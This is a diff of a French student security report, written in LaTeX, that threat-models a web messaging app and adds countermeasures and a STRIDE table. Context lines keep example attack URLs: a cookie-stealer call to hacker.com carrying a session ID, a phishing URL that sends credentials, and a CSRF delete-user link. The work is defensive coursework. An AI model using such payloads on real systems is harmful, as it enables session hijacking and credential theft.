@@ -9,6 +9,7 @@
 \usepackage{float}
 \usepackage{listings}
 \usepackage{hyperref}
+\usepackage{amsmath}
 
 \title{STI_Projet2_Plancherel_Vallon_rapport}
 \author{Plancherel Noemie & Vallon Axel}
@@ -131,7 +132,7 @@
     \begin{onehalfspacing}
     \begin{itemize}
     \item \textbf{Administrateur du système/réseau} qui n’est pas directement inclu dans le système
-    \item \textbf{Visiteur anonyme} qui n’a pas la possibilité d’accéder à la messagerie mais il peut se connecter ou créer un compte
+    \item \textbf{Visiteur anonyme} qui n’a pas la possibilité d’accéder à la messagerie mais il peut se connecter
     \end{itemize}
     \end{onehalfspacing}
     \subsection*{Actifs à haute valeur}
@@ -152,7 +153,7 @@
     \subsection*{DFD}
     Afin de bien comprendre les interactions entre les différents rôles du système, nous avons dessiné un DFD (Data Flow Diagram). Les flèches rouges représentent l’interaction avec les utilisateurs externes, les flèches vertes l’interaction avec la partie administration du système et quant au flèches jaunes, elles représentent les interactions du système.
     \begin{figure}[H]
-    \includegraphics[scale=0.4]{DFD.png}
+    \includegraphics[scale=0.3]{DFD.png}
     \centering
     \end{figure}
     \subsection*{Périmètre de sécurisation}
@@ -304,14 +305,15 @@ http://hacker.com/cookiestealer.php?cookie=PHPSESSID=riqbmmcaclh148j631uinq8375
 \end{lstlisting} 
 L'attaquant peut récupérer l'id de session et le remplacer avec sa session actuelle. Ainsi, il pourra s'authentifier sur le compte administrateur.
 
-        \paragraph{Contre-mesures}
+        \paragraph{Contre-mesures} 
+        Afin d'éviter des attaques XSS, on peut ajouter des sanitizers. On peut également échapper les caractères du contenu du message avant de l'afficher sur l'application web. Finalement, on peut régénérer les id de session régulièrement afin d'éviter tout vol de session (on peut ajouter un timeout de validité).
     \subsection*{Scénario de menace 6: Denial Of Service (DOS)}
         \paragraph{Impact sur l'entreprise} Moyen à haut (indisponibilité du service de messagerie)
         \paragraph{Source de menace} Hackers, Concurrent, Employé (avec des compétences avancées)
         \paragraph{Motivation} Cela pourrait être pour une vengeance personnelle ou simplement afin d'empêcher l'utilisation du système en le rendant indisponible.
         \paragraph{Actif ciblé} Système entier
         \paragraph{Scénario d'attaque} On peut utiliser à nouveau une injection HTML/Javascript dans un message afin d'envoyer en boucle infinie de requêtes au serveur à tous les utilisateurs du système. Ainsi, lorsqu'un utilisateur ouvre le message, le script est exécuté et le serveur surchargé.
-        \paragraph{Contre-mesures}
+        \paragraph{Contre-mesures} Pour éviter une attaque de type DOS, on peut ajouter des sanitizers dans le code. On peut également contrôler les champs d'entrées utilisateurs des messages afin d'éviter des injections de code.
     \subsection*{Scénario de menace 7: Suppression d'un utilisateur (CSRF)}
         \paragraph{Impact sur l'entreprise} Moyen
         \paragraph{Source de menace} Hacker, Concurrent
@@ -337,7 +339,7 @@ http://localhost:8080/delete_user?id=user4
 
 Et nous envoyons à la victime un message avec la requête ci-dessus afin de l'inciter à cliquer sur le lien et à supprimer l'utilisateur en paramètres.
         
-        \paragraph{Contre-mesures}
+        \paragraph{Contre-mesures} La première contre-mesure à prendre serait de contrôler les accès aux ressources, afin d'éviter que des utilisateurs qui n'ont pas l'autorisation puissent accéder aux listes de fichiers. On peut également ajouter des tokens anti-CSRF aux formulaires des messages.
     \subsection*{Scénario de menace 8: Phishing}
         \paragraph{Impact sur l'entreprise} Moyen
         \paragraph{Source de menace} Hacker, Cybercrime, Concurrent
@@ -347,16 +349,73 @@ Et nous envoyons à la victime un message avec la requête ci-dessus afin de l'i
                         \begin{lstlisting}[language=html]
 http://hacker.com/phishing.php?name=user3&password=12345
 \end{lstlisting} 
-        \paragraph{Contre-mesures}
-    \subsection*{Scénario de menace 9: Accès aux ressources}
-        \paragraph{Impact sur l'entreprise} Haut
-        \paragraph{Source de menace} Hacker, Concurrent, Employé
-        \paragraph{Motivation} La motivation principal serait d'avoir accès au système. Pour les employés, ce serait d'avoir accès aux fonctionnalités d'un administrateur.
-        \paragraph{Actif ciblé} Système en entier
-        \paragraph{Scénario d'attaque}
-        \paragraph{Contre-mesures}
+        \paragraph{Contre-mesures} On peut contrôler les champs d'entrées utilisateurs d'un message (sujet + corps) afin d'éviter des insertions de code. Une aure contre-mesure pourrait être de la prévention sur le phising pour les collaborateurs qui utilisent l'application web.
     \subsection*{STRIDE}
-        
+    Nous nous sommes basés sur le modèle STRIDE afin d'établir les scénarios ci-dessus. Nous avons premièrement représenté les différentes menaces auxquelles l'application web pourrait être vulnérable:
+    
+\begin{center}
+\begin{tabular}{|l c c c c c c|} 
+ \hline
+ Composant & S & T & R & I & D & E \\ [0.5ex] 
+ \hline\hline
+ Collaborateur & $\times$ & & $\times$ & & & $\times$\\
+ \hline
+ Administrateur & $\times$ & & $\times$ & & & $\times$ \\
+ \hline
+ Messages (DB) & & $\times$ & $\times$ & $\times$ &  & $\times$ \\
+ \hline
+ Utilisateurs (DB) & $\times$ & $\times$ & $\times$ & $\times$ &  & $\times$\\ [1ex] 
+ \hline
+ Messagerie STI (App) & $\times$ & $\times$ &  &  & $\times$ & \\ [1ex] 
+ \hline
+ Rédaction, lecture, réponse, suppression & & & & $\times$ & $\times$ & $\times$\\ [1ex] 
+ \hline
+ Gestion utilisateurs & $\times$ & & & & & $\times$ \\ [1ex] 
+ \hline
+ Incscription, connexion, changement de mot de passe & $\times$ & & $\times$ & & & $\times$\\ [1ex] 
+ \hline
+\end{tabular}
+\end{center}
+    
+    Nous avons ensuite listé les différentes scénarios d'attaque en fonction du modèle STRIDE:
+    \subsection*{Spoofing}
+    \begin{onehalfspacing}
+    \begin{itemize}
+     \item Scénario 1: Deviner des mots de passe
+     \item Scénario 3: Bruteforce de mots de passe
+     \item Scénario 4: Vol de mots de passe (interception)
+     \item Scénario 5: Vol de session
+    \end{itemize}
+    \end{onehalfspacing}
+    \subsection*{Tampering}
+    \begin{onehalfspacing}
+    \begin{itemize}
+     \item Scénario 2: Vol de base de données (injection SQL)
+     \item Scénario 7: Suppression d'un utilisateur (CSRF)
+    \end{itemize}
+    \end{onehalfspacing}
+    \subsection*{Repudiation}
+     Nous n'avons pas implémenté d'attaque dans cette catégorie.
+    \subsection*{Information disclosure}
+    \begin{onehalfspacing}
+    \begin{itemize}
+     \item Scénario 4: Vol de mots de passe (interception)
+     \item Scénario 8: Phishing
+    \end{itemize}
+    \end{onehalfspacing}
+    \subsection*{Denial of service}
+    \begin{onehalfspacing}
+    \begin{itemize}
+     \item Scénario 6: Denial Of Service (DOS)
+    \end{itemize}
+    \end{onehalfspacing}
+    \subsection*{Elevation of privileges}
+    \begin{onehalfspacing}
+    \begin{itemize}
+     \item Scénario 5: Vol de session
+     \item Scénario 7: Suppression d'un utilisateur (CSRF)
+    \end{itemize}
+    \end{onehalfspacing}
     \section*{Contre-mesures}    
 
 
